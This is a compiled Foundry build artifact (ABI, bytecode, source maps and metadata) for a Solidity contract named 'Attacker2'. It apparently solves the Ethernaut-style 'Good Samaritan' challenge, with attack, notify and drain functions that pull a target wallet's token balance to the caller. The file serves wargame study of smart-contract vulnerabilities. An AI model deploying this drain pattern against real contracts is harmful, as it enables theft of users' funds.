{"abi":[{"type":"constructor","inputs":[{"name":"goodSamaritanInstance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"balance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"drain","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"notify","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610685380380610685833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6105ff806100865f395ff3fe608060405260043610610066575f3560e01c806398d078b41161004157806398d078b4146100ea5780639e5faafc14610109578063b69ef8a81461011d575f5ffd5b8063022ec0951461007957806312065fe0146100b45780639890220b146100d6575f5ffd5b3661007557610073610132565b005b5f5ffd5b348015610084575f5ffd5b505f54610097906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b3480156100bf575f5ffd5b506100c8610189565b6040519081526020016100ab565b3480156100e1575f5ffd5b506100736102e3565b3480156100f5575f5ffd5b50610073610104366004610542565b6104a5565b348015610114575f5ffd5b50610073610132565b348015610128575f5ffd5b506100c860015481565b5f8054604080516304a286c760e31b815290516001600160a01b039092169263251436389260048084019382900301818387803b158015610171575f5ffd5b505af1158015610183573d5f5f3e3d5ffd5b50505050565b5f8054604080517f521eb273000000000000000000000000000000000000000000000000000000008152905183926001600160a01b03169163521eb2739160048083019260209291908290030181865afa1580156101e9573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061020d9190610559565b90505f816001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa15801561024c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102709190610559565b6040516370a0823160e01b81526001600160a01b038481166004830152919250908216906370a0823190602401602060405180830381865afa1580156102b8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102dc9190610586565b9250505090565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663521eb2736040518163ffffffff1660e01b8152600401602060405180830381865afa158015610333573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103579190610559565b90505f816001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa158015610396573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103ba9190610559565b6040516370a0823160e01b81526001600160a01b0384811660048301529192509082169063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561040c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104309190610586565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b1681526001600160a01b03909216600483015260248201526044015f604051808303815f87803b15801561048b575f5ffd5b505af115801561049d573d5f5f3e3d5ffd5b505050505050565b5f805460408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff166304a286c760e31b17905290516001600160a01b03909216916104fd919061059d565b5f604051808303815f865af19150503d805f8114610536576040519150601f19603f3d011682016040523d82523d5f602084013e61053b565b606091505b5050505050565b5f60208284031215610552575f5ffd5b5035919050565b5f60208284031215610569575f5ffd5b81516001600160a01b038116811461057f575f5ffd5b9392505050565b5f60208284031215610596575f5ffd5b5051919050565b5f82515f5b818110156105bc57602081860181015185830152016105a2565b505f92019182525091905056fea2646970667358221220de304e0186ae0cc96b72c2bd624560159ee2729fd8213b42ef67c8a4c2ee29fd64736f6c634300081c0033","sourceMap":"451:967:0:-:0;;;534:92;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;587:8;:32;;-1:-1:-1;;;;;;587:32:0;-1:-1:-1;;;;;587:32:0;;;;;;;;;;451:967;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;451:967:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405260043610610066575f3560e01c806398d078b41161004157806398d078b4146100ea5780639e5faafc14610109578063b69ef8a81461011d575f5ffd5b8063022ec0951461007957806312065fe0146100b45780639890220b146100d6575f5ffd5b3661007557610073610132565b005b5f5ffd5b348015610084575f5ffd5b505f54610097906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b3480156100bf575f5ffd5b506100c8610189565b6040519081526020016100ab565b3480156100e1575f5ffd5b506100736102e3565b3480156100f5575f5ffd5b50610073610104366004610542565b6104a5565b348015610114575f5ffd5b50610073610132565b348015610128575f5ffd5b506100c860015481565b5f8054604080516304a286c760e31b815290516001600160a01b039092169263251436389260048084019382900301818387803b158015610171575f5ffd5b505af1158015610183573d5f5f3e3d5ffd5b50505050565b5f8054604080517f521eb273000000000000000000000000000000000000000000000000000000008152905183926001600160a01b03169163521eb2739160048083019260209291908290030181865afa1580156101e9573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061020d9190610559565b90505f816001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa15801561024c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102709190610559565b6040516370a0823160e01b81526001600160a01b038481166004830152919250908216906370a0823190602401602060405180830381865afa1580156102b8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102dc9190610586565b9250505090565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663521eb2736040518163ffffffff1660e01b8152600401602060405180830381865afa158015610333573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103579190610559565b90505f816001600160a01b03166311df99956040518163ffffffff1660e01b8152600401602060405180830381865afa158015610396573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103ba9190610559565b6040516370a0823160e01b81526001600160a01b0384811660048301529192509082169063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561040c573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104309190610586565b6040517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b1681526001600160a01b03909216600483015260248201526044015f604051808303815f87803b15801561048b575f5ffd5b505af115801561049d573d5f5f3e3d5ffd5b505050505050565b5f805460408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff166304a286c760e31b17905290516001600160a01b03909216916104fd919061059d565b5f604051808303815f865af19150503d805f8114610536576040519150601f19603f3d011682016040523d82523d5f602084013e61053b565b606091505b5050505050565b5f60208284031215610552575f5ffd5b5035919050565b5f60208284031215610569575f5ffd5b81516001600160a01b038116811461057f575f5ffd5b9392505050565b5f60208284031215610596575f5ffd5b5051919050565b5f82515f5b818110156105bc57602081860181015185830152016105a2565b505f92019182525091905056fea2646970667358221220de304e0186ae0cc96b72c2bd624560159ee2729fd8213b42ef67c8a4c2ee29fd64736f6c634300081c0033","sourceMap":"451:967:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;758:8;:6;:8::i;:::-;451:967;;;;;476:23;;;;;;;;;;-1:-1:-1;476:23:0;;;;-1:-1:-1;;;;;476:23:0;;;;;;-1:-1:-1;;;;;178:55:1;;;160:74;;148:2;133:18;476:23:0;;;;;;;;921:235;;;;;;;;;;;;;:::i;:::-;;;391:25:1;;;379:2;364:18;921:235:0;245:177:1;1162:254:0;;;;;;;;;;;;;:::i;779:136::-;;;;;;;;;;-1:-1:-1;779:136:0;;;;;:::i;:::-;;:::i;632:83::-;;;;;;;;;;;;;:::i;505:22::-;;;;;;;;;;;;;;;;632:83;681:8;;;667:41;;;-1:-1:-1;;;667:41:0;;;;-1:-1:-1;;;;;681:8:0;;;;667:39;;:41;;;;;;;;;;681:8;;667:41;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;632:83::o;921:235::-;966:7;1024:8;;1010:32;;;;;;;;966:7;;-1:-1:-1;;;;;1024:8:0;;1010:30;;:32;;;;;;;;;;;;;;1024:8;1010:32;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;985:57;;1052:12;1074:14;-1:-1:-1;;;;;1067:27:0;;:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1113:36;;-1:-1:-1;;;1113:36:0;;-1:-1:-1;;;;;178:55:1;;;1113:36:0;;;160:74:1;1052:44:0;;-1:-1:-1;1113:20:0;;;;;;133:18:1;;1113:36:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1106:43;;;;921:235;:::o;1162:254::-;1198:22;1237:8;;;;;;;;;-1:-1:-1;;;;;1237:8:0;-1:-1:-1;;;;;1223:30:0;;:32;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1198:57;;1265:19;1294:14;-1:-1:-1;;;;;1287:27:0;;:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1365:43;;-1:-1:-1;;;1365:43:0;;-1:-1:-1;;;;;178:55:1;;;1365:43:0;;;160:74:1;1265:51:0;;-1:-1:-1;1326:26:0;;;;;;1353:10;;1326:26;;1365:27;;133:18:1;;1365:43:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1326:83;;;;;;;;;;-1:-1:-1;;;;;1311:55:1;;;1326:83:0;;;1293:74:1;1383:18;;;1376:34;1266:18;;1326:83:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1188:228;;1162:254::o;779:136::-;831:12;849:8;;863:44;;;;;;;;;;;;;;;;;;-1:-1:-1;;;863:44:0;;;849:59;;-1:-1:-1;;;;;849:8:0;;;;:59;;863:44;849:59;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;779:136:0:o;427:180:1:-;486:6;539:2;527:9;518:7;514:23;510:32;507:52;;;555:1;552;545:12;507:52;-1:-1:-1;578:23:1;;427:180;-1:-1:-1;427:180:1:o;612:313::-;682:6;735:2;723:9;714:7;710:23;706:32;703:52;;;751:1;748;741:12;703:52;783:9;777:16;-1:-1:-1;;;;;826:5:1;822:54;815:5;812:65;802:93;;891:1;888;881:12;802:93;914:5;612:313;-1:-1:-1;;;612:313:1:o;930:184::-;1000:6;1053:2;1041:9;1032:7;1028:23;1024:32;1021:52;;;1069:1;1066;1059:12;1021:52;-1:-1:-1;1092:16:1;;930:184;-1:-1:-1;930:184:1:o;1421:412::-;1550:3;1588:6;1582:13;1613:1;1623:129;1637:6;1634:1;1631:13;1623:129;;;1735:4;1719:14;;;1715:25;;1709:32;1696:11;;;1689:53;1652:12;1623:129;;;-1:-1:-1;1807:1:1;1771:16;;1796:13;;;-1:-1:-1;1771:16:1;1421:412;-1:-1:-1;1421:412:1:o","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","balance()":"b69ef8a8","drain()":"9890220b","getBalance()":"12065fe0","instance()":"022ec095","notify(uint256)":"98d078b4"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"goodSamaritanInstance\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"drain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"instance\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"notify\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/Attacker2.sol\":\"Attacker2\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/Attacker2.sol\":{\"keccak256\":\"0x8280c74d24e2f20c46c57ba26951c6100f5b567d2784494da64cb6a00fed95f5\",\"urls\":[\"bzz-raw://0374a2dc0c33fd302d4e3479db2912c42b3d4b6b2bae1d2fefbd1689519d0c79\",\"dweb:/ipfs/QmVy6sziF3FMdMK2xJX9wSNorouR5qvBuKQgGtQmjW7gLv\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"goodSamaritanInstance","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"attack"},{"inputs":[],"stateMutability":"view","type":"function","name":"balance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"drain"},{"inputs":[],"stateMutability":"view","type":"function","name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"instance","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"stateMutability":"nonpayable","type":"function","name":"notify"},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/Attacker2.sol":"Attacker2"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/Attacker2.sol":{"keccak256":"0x8280c74d24e2f20c46c57ba26951c6100f5b567d2784494da64cb6a00fed95f5","urls":["bzz-raw://0374a2dc0c33fd302d4e3479db2912c42b3d4b6b2bae1d2fefbd1689519d0c79","dweb:/ipfs/QmVy6sziF3FMdMK2xJX9wSNorouR5qvBuKQgGtQmjW7gLv"],"license":null}},"version":1},"id":0}